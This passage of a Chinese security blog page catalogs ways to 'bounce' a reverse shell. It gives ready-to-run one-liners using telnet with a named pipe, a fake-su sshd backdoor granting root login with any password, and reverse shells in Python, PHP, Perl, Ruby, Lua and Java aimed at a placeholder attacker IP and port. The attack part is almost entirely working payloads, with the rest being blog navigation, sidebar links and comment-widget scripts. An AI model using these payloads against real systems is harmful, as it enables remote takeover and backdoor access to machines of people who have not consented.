+<h3 id="利用Telnet"><a href="#利用Telnet" class="headerlink" title="利用Telnet"></a>利用Telnet</h3><p>方法1：单端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 2333</span><br><span class="line">mknod a p; telnet attacker_ip 2333 0&lt;a | /bin/bash 1&gt;a</span><br></pre></td></tr></table></figure>
+
+<p>方法2：双端口</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 4000</span><br><span class="line">nc -lvvp 5000</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4000 输入 5000输出</span></span><br><span class="line">telnet ip 4000 | /bin/bash | telnet ip 5000</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="利用SSH"><a href="#利用SSH" class="headerlink" title="利用SSH"></a>利用SSH</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">受害主机执行:</span><br><span class="line">ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=5000;   </span><br><span class="line"></span><br><span class="line">攻击机器:</span><br><span class="line">ssh root@victim_ip -p 5000 [用户名root,密码随意]</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="利用各种语言脚本"><a href="#利用各种语言脚本" class="headerlink" title="利用各种语言脚本"></a>利用各种语言脚本</h2><p>攻击机ip，监听port</p>
+<h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><br></pre></td></tr></table></figure>
+
+<h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r '$sock=fsockopen("ip",port);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span><br></pre></td></tr></table></figure>
+
+<h3 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e 'use Socket;$i="ip";$p=port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span><br></pre></td></tr></table></figure>
+
+<h3 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e 'c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br><span class="line">或</span><br><span class="line">ruby -rsocket -e 'exit if fork;c=TCPSocket.new("ip","port");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span><br></pre></td></tr></table></figure>
+
+<h3 id="Lua"><a href="#Lua" class="headerlink" title="Lua"></a>Lua</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lua -e <span class="string">"require('socket');require('os');t=socket.tcp();t:connect('ip','port');os.execute('/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3');"</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Revs</span> </span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> args</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> Exception </span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">        Runtime r = Runtime.getRuntime();</span><br><span class="line">        String cmd[]= &#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/ip/port;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>&#125;;</span><br><span class="line">        Process p = r.exec(cmd);</span><br><span class="line">        p.waitFor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">1</a></p>
+<p><a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">2</a></p>
+<p><a href="https://xz.aliyun.com/t/9488#toc-9" target="_blank" rel="noopener">3</a></p>
+<p><a href="https://jkme.github.io/pages/reverse-shell.html" target="_blank" rel="noopener">4</a></p>
+<p><a href="https://www.jianshu.com/p/cb26a0f6c622" target="_blank" rel="noopener">netcat用法</a></p>
+<p><a href="https://huangwang.github.io/2019/09/22/netcat%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95%E7%AE%80%E4%BB%8B/" target="_blank" rel="noopener">netcat使用方法</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/shell/" rel="tag"><i class="fa fa-tag"></i>shell</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="prev" title="Docker学习笔记">
+      <i class="fa fa-chevron-left"></i> Docker学习笔记
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%90%86%E8%AE%BA/" rel="next" title="程序分析理论">
+      程序分析理论 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+      <!--
+      <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="https://link.hhtjim.com/163/26348068.mp3"></iframe>
+      -->
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#序言"><span class="nav-number">1.</span> <span class="nav-text">序言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#linux文件描述符和重定向"><span class="nav-number">2.</span> <span class="nav-text">linux文件描述符和重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#文件描述符"><span class="nav-number">2.1.</span> <span class="nav-text">文件描述符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#重定向"><span class="nav-number">2.2.</span> <span class="nav-text">重定向</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#文件描述符的操作"><span class="nav-number">2.2.1.</span> <span class="nav-text">文件描述符的操作</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#命令的顺序"><span class="nav-number">2.2.2.</span> <span class="nav-text">命令的顺序</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#NetCat基本用法"><span class="nav-number">3.</span> <span class="nav-text">NetCat基本用法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#正向连接shell"><span class="nav-number">3.1.</span> <span class="nav-text">正向连接shell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#反向连接shell"><span class="nav-number">3.2.</span> <span class="nav-text">反向连接shell</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反弹shell多种姿势"><span class="nav-number">4.</span> <span class="nav-text">反弹shell多种姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#利用Bash"><span class="nav-number">4.1.</span> <span class="nav-text">利用Bash</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#借助exec"><span class="nav-number">4.1.1.</span> <span class="nav-text">借助exec</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用NetCat"><span class="nav-number">4.2.</span> <span class="nav-text">利用NetCat</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用协议"><span class="nav-number">4.3.</span> <span class="nav-text">利用协议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#利用OpenSSL"><span class="nav-number">4.3.1.</span> <span class="nav-text">利用OpenSSL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用Telnet"><span class="nav-number">4.3.2.</span> <span class="nav-text">利用Telnet</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用SSH"><span class="nav-number">4.3.3.</span> <span class="nav-text">利用SSH</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#利用各种语言脚本"><span class="nav-number">4.4.</span> <span class="nav-text">利用各种语言脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#python"><span class="nav-number">4.4.1.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#php"><span class="nav-number">4.4.2.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#perl"><span class="nav-number">4.4.3.</span> <span class="nav-text">perl</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ruby"><span class="nav-number">4.4.4.</span> <span class="nav-text">ruby</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Lua"><span class="nav-number">4.4.5.</span> <span class="nav-text">Lua</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Java"><span class="nav-number">4.4.6.</span> <span class="nav-text">Java</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="fynch3r"
+      src="/images/yfy.png">
+  <p class="site-author-name" itemprop="name">fynch3r</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">57</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">14</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/fynch3r" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;fynch3r" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title">
+      <i class="fa fa-fw fa-link"></i>
+      友链
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.0kami.cn/" title="https:&#x2F;&#x2F;blog.0kami.cn&#x2F;" rel="noopener" target="_blank">wh1t3p1g</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://zebork.org/" title="https:&#x2F;&#x2F;zebork.org" rel="noopener" target="_blank">Zebork</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://apsarasx.com/" title="https:&#x2F;&#x2F;apsarasx.com" rel="noopener" target="_blank">ApsarasX</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.safe6.cn/index" title="http:&#x2F;&#x2F;www.safe6.cn&#x2F;index" rel="noopener" target="_blank">Safe6</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://su18.org/" title="https:&#x2F;&#x2F;su18.org" rel="noopener" target="_blank">su18</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://summersec.github.io/" title="https:&#x2F;&#x2F;summersec.github.io" rel="noopener" target="_blank">SummerSec</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.cnblogs.com/tr1ple/" title="https:&#x2F;&#x2F;www.cnblogs.com&#x2F;tr1ple&#x2F;" rel="noopener" target="_blank">tr1ple</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://4ra1n.love/" title="https:&#x2F;&#x2F;4ra1n.love&#x2F;" rel="noopener" target="_blank">4ra1n</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://www.cnpanda.net/" title="http:&#x2F;&#x2F;www.cnpanda.net&#x2F;" rel="noopener" target="_blank">panda</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://m0d9.me/" title="http:&#x2F;&#x2F;m0d9.me&#x2F;" rel="noopener" target="_blank">yangbh</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://anemone.top/" title="http:&#x2F;&#x2F;anemone.top" rel="noopener" target="_blank">Anemone95</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.kingkk.com/" title="https:&#x2F;&#x2F;www.kingkk.com&#x2F;" rel="noopener" target="_blank">kingkk</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://www.yuque.com/ni4n/blogs" title="https:&#x2F;&#x2F;www.yuque.com&#x2F;ni4n&#x2F;blogs" rel="noopener" target="_blank">Ni4n</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+
+<div class="copyright">
+  
+  &copy; 2019 – 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart" aria-hidden="true"></i>
+  </span>
+   Powered By - 
+  <span class="author" itemprop="copyrightHolder">fynch3r</span>
+
+  <!--
+    <span class="post-meta-divider"> | </span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">834k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">23:10</span>
+  -->
+
+</div>
+
+        
+
+
+
+
+
+
+  <script>
+  function leancloudSelector(url) {
+    url = encodeURI(url);
+    return document.getElementById(url).querySelector('.leancloud-visitors-count');
+  }
+  if (CONFIG.page.isPost) {
+    function addCount(Counter) {
+      var visitors = document.querySelector('.leancloud_visitors');
+      var url = decodeURI(visitors.getAttribute('id'));
+      var title = visitors.dataset.flagTitle;
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length > 0) {
+            var counter = results[0];
+            Counter('put', '/classes/Counter/' + counter.objectId, { time: { '__op': 'Increment', 'amount': 1 } })
+              .then(response => response.json())
+              .then(() => {
+                leancloudSelector(url).innerText = counter.time + 1;
+              })
+              .catch(error => {
+                console.error('Failed to save visitor count', error);
+              })
+          } else {
+              Counter('post', '/classes/Counter', { title, url, time: 1 })
+                .then(response => response.json())
+                .then(() => {
+                  leancloudSelector(url).innerText = 1;
+                })
+                .catch(error => {
+                  console.error('Failed to create', error);
+                });
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+  } else {
+    function showTime(Counter) {
+      var visitors = document.querySelectorAll('.leancloud_visitors');
+      var entries = [...visitors].map(element => {
+        return decodeURI(element.getAttribute('id'));
+      });
+
+      Counter('get', `/classes/Counter?where=${JSON.stringify({ url: { '$in': entries } })}`)
+        .then(response => response.json())
+        .then(({ results }) => {
+          if (results.length === 0) {
+            document.querySelectorAll('.leancloud_visitors .leancloud-visitors-count').forEach(element => {
+              element.innerText = 0;
+            });
+            return;
+          }
+          for (let item of results) {
+            let { url, time } = item;
+            leancloudSelector(url).innerText = time;
+          }
+          for (let url of entries) {
+            var element = leancloudSelector(url);
+            if (element.innerText == '') {
+              element.innerText = 0;
+            }
+          }
+        })
+        .catch(error => {
+          console.error('LeanCloud Counter Error', error);
+        });
+    }
+  }
+
+  fetch('https://app-router.leancloud.cn/2/route?appId=Xm92yiHJb6lBpsP02sgh3uGo-gzGzoHsz')
+    .then(response => response.json())
+    .then(({ api_server }) => {
+      var Counter = (method, url, data) => {
+        return fetch(`https://${api_server}/1.1${url}`, {
+          method,
+          headers: {
+            'X-LC-Id'     : 'Xm92yiHJb6lBpsP02sgh3uGo-gzGzoHsz',
+            'X-LC-Key'    : 'l8KvoMr1i8urA7X7BzPMtQC7',
+            'Content-Type': 'application/json',
+          },
+          body: JSON.stringify(data)
+        });
+      };
+      if (CONFIG.page.isPost) {
+        if (CONFIG.hostname !== location.hostname) return;
+        addCount(Counter);
+      } else if (document.querySelectorAll('.post-title-link').length >= 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'Xm92yiHJb6lBpsP02sgh3uGo-gzGzoHsz',
+      appKey     : 'l8KvoMr1i8urA7X7BzPMtQC7',
+      placeholder: "Say Something~",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+
+<!--
+
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//unjkp.com/valine/dist/Valine.min.js"></script>  
+  <script src="/js/Valine.min.js"></script> 
+
+   
+  
+  <script src="/js/Valine.min.js"></script>
+  
+  <script type="text/javascript">
+    var GUEST = ['nick','mail','link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(function (item) {
+      return GUEST.indexOf(item)>-1;
+    });
+    new Valine({
+        el: '#comments' ,
+        verify: false,
+        notify: false,
+        appId: 'Xm92yiHJb6lBpsP02sgh3uGo-gzGzoHsz',
+        appKey: 'l8KvoMr1i8urA7X7BzPMtQC7',
+        placeholder: 'Say Something~',
+        avatar:'mm',
+        guest_info:['nick'] ,  //评论者只需要提供评论的昵称即可
+        pageSize:'10' || 10,
+    });
+  
+    var infoEle = document.querySelector('#comments .info');
+    if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0){
+      infoEle.childNodes.forEach(function(item) {
+        item.parentNode.removeChild(item);
+      });
+    }
+  </script>
+
+-->
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/click_love.js"></script>
